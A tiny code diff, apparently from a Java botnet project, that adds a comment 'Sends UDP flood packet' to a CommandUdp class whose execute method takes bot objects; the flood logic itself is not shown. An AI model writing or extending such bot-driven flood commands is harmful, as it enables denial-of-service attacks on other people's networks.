@@ -8,6 +8,9 @@ import com.redpois0n.exceptions.IllegalArgumentLengthException;
 
 public class CommandUdp extends Command {
 
+	/**
+	 * Sends UDP flood packet
+	 */
 	@Override
 	public void execute(String[] args, Bot[] bots) throws Exception {
 		if (args.length != 3) {
